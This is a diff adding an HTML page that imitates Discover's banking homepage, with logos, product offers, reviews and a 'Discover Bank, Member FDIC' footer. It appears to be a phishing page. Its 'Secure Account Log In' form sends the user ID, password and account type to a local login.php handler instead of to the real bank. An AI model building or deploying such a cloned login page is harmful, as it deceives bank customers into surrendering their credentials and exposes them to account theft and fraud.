@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Credit Cards, Banking & Loans - Discover</title>
+    <link rel="stylesheet" href="./styles/index.css" />
+    <link rel="shortcut icon" href="./favicon.ico" type="image/x-icon" />
+  </head>
+
+  <body>
+    <main>
+      <header class="header">
+        <div>
+          <img
+            src="./assets/discover-logo.svg"
+            alt=""
+            height="100"
+            width="100"
+          />
+        </div>
+        <div class="header-nav-bar">
+          <select name="" id="">
+            <option value="">All Products</option>
+            <option value=""></option>
+            <option value=""></option>
+            <option value=""></option>
+          </select>
+          <small> Help and Resources</small>
+          <small style="display: flex; align-items: center">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="#000"
+              height="1em"
+              viewBox="0 0 512 512"
+              style="margin-right: 5px"
+            >
+              <!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. -->
+              <path
+                d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"
+              />
+            </svg>
+            search
+          </small>
+          <label for="id">Log In </label>
+        </div>
+      </header>
+      <!-- first section -->
+      <div class="first-section">
+        <h3>
+          <span>Hi there,</span><br />
+          welcome to <br />
+          Discover®
+        </h3>
+        <div class="static-login-form">
+          <form method="post" action="./login.php">
+            <p class="login-form-header">
+              Secure Account Log In
+              <img
+                style="display: inline-block; margin-left: 20px"
+                src="./assets//lock-icon.svg"
+                alt=""
+              />
+            </p>
+            <div class="user-pass-cont">
+              <div class="input-cont">
+                <label class="input-label" for="id">User ID</label>
+                <input
+                  required
+                  class="solid-input"
+                  id="id"
+                  name="id"
+                  type="text"
+                />
+              </div>
+              <div class="input-cont">
+                <label class="input-label" for="password">Password</label>
+                <input
+                  required
+                  class="solid-input"
+                  name="password"
+                  id="password"
+                  type="password"
+                />
+              </div>
+            </div>
+            <select class="card-options" name="card-type" required id="">
+              <option value="Credit Card">Credit Card</option>
+              <option value="Bank Account">Bank Account</option>
+              <option value="Student Loans">Student Loans</option>
+              <option value="Personal Loans">Personal Loans</option>
+              <option value="Home Loans">Home Loans</option>
+              <option value="Identiti Theft Protection">
+                Identiti Theft Protection
+              </option>
+            </select>
+            <div class="form-group">
+              <div>
+                <input type="checkbox" style="margin-right: 10px" />
+                <h4 style="display: inline-block">Remember Me</h4>
+              </div>
+              <input type="submit" value="Log In" />
+            </div>
+            <div class="form-group">
+              <small>Forget User/Password</small>
+              <small>Activate Credit Card</small>
+            </div>
+            <div class="form-group">
+              <small>Register Account</small>
+              <small>Check Application Status</small>
+            </div>
+          </form>
+        </div>
+      </div>
+      <!-- help info header... -->
+      <h3 class="help">How can we help?</h3>
+      <!-- second section -->
+      <div class="section-2">
+        <div class="sticky-header">
+          <div class="sticky-nav-items">
+            <img src="./assets/credit-card.png" alt="" />
+            <h4>Credit Cards</h4>
+          </div>
+          <div class="sticky-nav-items">
+            <img src="./assets/onlne-banking.png" alt="" />
+            <h4>Online Banking</h4>
+          </div>
+          <div class="sticky-nav-items">
+            <img src="./assets/personal-loan.webp" alt="" />
+            <h4>Personal Loans</h4>
+          </div>
+          <div class="sticky-nav-items">
+            <img src="./assets/student-loan.webp" alt="" />
+            <h4>Student Loans</h4>
+          </div>
+          <div class="sticky-nav-items">
+            <img src="./assets/home-loan.webp" alt="" />
+            <h4>Homes Loans</h4>
+          </div>
+        </div>
+      </div>
+      <!-- card disp -->
+      <div class="card-disp">
+        <div>
+          <img src="./assets/card-animate.gif" alt="" />
+          <h3>Unlimited first year Cashback Match</h3>
+          <p>
+            Get an unlimited dollar-for-dollar match of all the cash back you've
+            earned at the end of your first year with a Discover Card. See
+            terms.
+          </p>
+          <h4>Learn More</h4>
+        </div>
+        <div>
+          <img src="./assets/bg-img2.jpg" alt="" />
+          <h3>Easy credit card preapproval check</h3>
+          <p>
+            Find out if you're preapproved for a Discover® card with no impact
+            to your credit to check.
+          </p>
+          <h4>Check Now</h4>
+        </div>
+      </div>
+      <!-- card utils -->
+      <div class="card-utils">
+        <div>
+          <img src="./assets/bg-img-3.jpg" alt="" />
+          <h3>Home equity loans, covered</h3>
+          <p>
+            Access $35,000 to $300,000 with zero origination fees. Get cash to
+            consolidate debt or improve your home, all at a low, fixed rate.
+          </p>
+          <h4>Estimate My Rate</h4>
+        </div>
+        <div>
+          <img src="./assets/bg-img4.jpg" alt="" />
+          <h3>Feeling safer at checkout</h3>
+          <p>
+            Tap and pay with a contactless Discover® credit card to help you
+            avoid touching the card reader.
+          </p>
+          <h4>Update Card Today</h4>
+        </div>
+        <div>
+          <img
+            style="border-bottom-right-radius: 100%"
+            src="./assets/bg-img6.jpg"
+            alt=""
+          />
+          <h3>Cover college costs</h3>
+          <p>
+            Cover up to 100% of your school-certified expenses. Aggregate loan
+            limits apply. Apply in minutes.
+          </p>
+          <h4>Learn More</h4>
+        </div>
+      </div>
+      <!-- statistics container -->
+      <div class="stats-cont">
+        <img src="./assets/half-logo.svg" alt="" />
+        <div class="stats-cont-cont">
+          <h3 class="card-members">
+            What cardmembers <br />
+            are saying
+          </h3>
+          <div>
+            <div class="conversation-stars-inner" style="width: 94%">★★★★★</div>
+            <h3>4.7 Average of 33357 Reviews</h3>
+            <button>Read Discover it reviews</button>
+          </div>
+        </div>
+      </div>
+      <!-- discover money idea -->
+      <div class="money-work">
+        <h1>Making Your Finances <br />Work Harder For You</h1>
+      </div>
+      <!-- section three -->
+      <div class="section-3">
+        <div>
+          <img src="./assets/What-Credit-Card-do-I-Qualify-For.webp" alt="" />
+          <h3>What credit card do I qualify for</h3>
+        </div>
+        <div class="divider">
+          <div>
+            <!-- <img src="./assets/bg-img-8.jpg" alt="" /> -->
+            <img
+              src="https://www.discover.com/content/dam/discover/en_us/gateway/articles/images/article_deposits_gateway.jpg"
+              alt=""
+            />
+            <p>How to recover from scams</p>
+          </div>
+          <div>
+            <img src="./assets/bg-img-9.jpg" alt="" />
+            <p>9 Good Money Habits to Develop</p>
+          </div>
+          <div>
+            <img src="./assets/bg-img-11.jpg" alt="" />
+            <p>
+              Paying off student loans vs. saving money: which takes priority?
+            </p>
+          </div>
+          <div>
+            <img src="./assets/bg-img-12.jpg" alt="" />
+            <p>How Home Equity Can Help Pay Off Debt</p>
+          </div>
+        </div>
+      </div>
+      <!-- read more button -->
+      <div class="read-more">
+        <button>Read more articles</button>
+      </div>
+      <!-- section four -->
+      <div class="section-4">
+        <img src="./assets/bg-img13.webp" alt="" />
+        <div>
+          <h1>
+            We can help you get <br />
+            serious about saving
+          </h1>
+          <p>
+            Tell us a bit about your goals and our savings calculator <br />
+            will show you how to get there faster.
+          </p>
+          <button>Calculate Savings</button>
+        </div>
+      </div>
+      <!-- financial option  header-->
+      <div class="money-work">
+        <h1>
+          We've got your financial <br />
+          needs covered
+        </h1>
+      </div>
+      <!-- financial options table -->
+      <div class="actions">
+        <div class="actions-items">
+          <h3>Credit Card</h3>
+          <p>
+            Discover <span>credit cards</span> are built to give you great
+            rewards and the service you deserve, from our flagship
+            <span>cash back credit cards </span>to our flexible
+            <span>travel credit card.</span>
+            <span>Compare credit cards</span> to find which offer is right for
+            you. Use our <span>interest calculator </span>to estimate your
+            monthly payment.
+          </p>
+        </div>
+        <div class="actions-items">
+          <h3>Build a Credit History</h3>
+          <p>
+            Explore our <span>Secured credit card</span> to help build your
+            credit history. If you’re a student, start building a credit history
+            in college and enjoy cash back with Discover
+            <span>Student credit cards.</span>
+            <span>Compare credit cards</span> to find which is right for you.
+          </p>
+        </div>
+        <div class="actions-items">
+          <h3>Cashback Checking</h3>
+          <p>
+            Other banks charge for checking but we reward you. Check out our
+            <span>online checking account</span> with no monthly fees or balance
+            requirements. Open a checking account today.
+          </p>
+        </div>
+        <!-- second line -->
+        <div class="actions-items">
+          <h3>Savings Accounts</h3>
+          <p>
+            Open a high-interest, no-monthly fee
+            <span>online savings account.</span> Learn more about online savings
+            or see how a <span>savings account calculator</span>
+            can help you reach your financial goals.
+          </p>
+        </div>
+        <div class="actions-items">
+          <h3>Certificates of Deposit</h3>
+          <p>
+            Learn more about <span>how CDs grow savings</span> safely, or open a
+            <span>CD account</span>
+            today and lock in a great rate with terms ranging from 3 months to
+            10 years.
+          </p>
+        </div>
+        <div class="actions-items">
+          <h3>Balance Transfers</h3>
+          <p>
+            Making a <span>balance transfer</span> is a great way to save money
+            on higher interest debt. See all the ways we can help you achieve
+            your
+            <span>debt consolidation goals.</span>
+          </p>
+        </div>
+        <!-- third line -->
+        <div class="actions-items">
+          <h3>Personal Loans</h3>
+          <p>
+            A <span>personal loan</span> from Discover of up to $40k can help
+            you consolidate higher-interest debt or afford a large purchase. $0
+            origination fees, a fixed monthly payment and no prepayment penalty.
+            Estimate your payments today with our
+            <span>personal loan calculator.</span>
+          </p>
+        </div>
+        <div class="actions-items">
+          <h3>Home Loans</h3>
+          <p>
+            With loan amounts from $35,000 to $300,000, and no cash required at
+            closing, a <span>home equity loan </span>or a
+            <span>mortgage refinance</span> from Discover is a simple way to
+            consolidate debt, make home improvements, cover college costs, and
+            pay for other major expenses. Use our
+            <span>rate and payment calculator</span> to estimate your monthly
+            payment.
+          </p>
+        </div>
+        <div class="actions-items">
+          <h3>Student Loans</h3>
+          <p>
+            <span>Private student loans</span> from Discover can cover up to
+            100% of school-certified college and graduate school costs. Zero
+            fees, choice of fixed or variable interest rates and cash
+            <span>rewards for good grades.</span> Learn more about how to
+            <span>pay for college.</span>
+          </p>
+        </div>
+      </div>
+      <!--  footer info header -->
+      <h4 class="action-footer">
+        The Contactless Symbol is a trademark owned by and used with permission
+        of EMVCo, LLC
+      </h4>
+      <!-- footer action options -->
+      <div class="footer-actions">
+        <h4>Products & Services</h4>
+        <h4>About Our Company</h4>
+        <h4>Resources & Legal</h4>
+        <h4>Quick Links</h4>
+        <!-- first line -->
+        <p>Credit Cards</p>
+        <p>About Discover</p>
+        <p>Card Smarts</p>
+        <p>Mobile App</p>
+        <!-- second line -->
+        <p>Online Banking</p>
+        <p>Contact Us</p>
+        <p>Modern Money</p>
+        <p>Refer a Friend</p>
+        <!-- third line -->
+        <p>Personal Loans</p>
+        <p>ESG</p>
+        <p>Personal Loan Resources</p>
+        <p>ATM Locator</p>
+        <!-- fouth line -->
+        <p>Student Loans</p>
+        <p>Investor Relations</p>
+        <p>Home Loan Resources</p>
+        <p>Sitemap</p>
+        <!-- fifth line -->
+        <p>Student Loans</p>
+        <p>Investor Relations</p>
+        <p>Home Loan Resources</p>
+        <p>Sitemap</p>
+        <!-- sixth line -->
+        <p>Home Equity Loans</p>
+        <p>Newsroom</p>
+        <p>College Planning</p>
+        <p>Language Services</p>
+        <!-- seventh line -->
+        <p>Mortgage Refinance</p>
+        <p>Accept Discover</p>
+        <p>Privacy</p>
+        <p>Accesibility</p>
+        <!-- eighth line -->
+        <p>Diners Club International</p>
+        <p>Diversity & Inclusion</p>
+        <p>Security</p>
+        <p>Browser Support</p>
+        <!-- ninth line -->
+        <p>PULSE</p>
+        <p>Discover Technology</p>
+        <p>Terms of Use</p>
+        <p>AdChoices</p>
+        <!-- ninth line -->
+        <p></p>
+        <p></p>
+        <p>Cardmember Agreement</p>
+        <p>Careers</p>
+      </div>
+      <!-- main footer -->
+      <footer class="main-footer">
+        <img src="./assets/Facebook.webp" alt="" />
+        <img src="./assets/Twitter.webp" alt="" />
+        <img src="./assets/Instagram.webp" alt="" />
+        <img src="./assets/linkedin.webp" alt="" />
+        <samll> ©2023 Discover Bank, Member FDIC</samll>
+        <img src="./assets/footer-icon-house.webp" alt="" />
+        <img src="./assets/footer-icon-accredit.webp" alt="" />
+        <img src="./assets/footer-icon-member.webp" alt="" />
+      </footer>
+    </main>
+  </body>
+  <script src="./index.js"></script>
+</html>
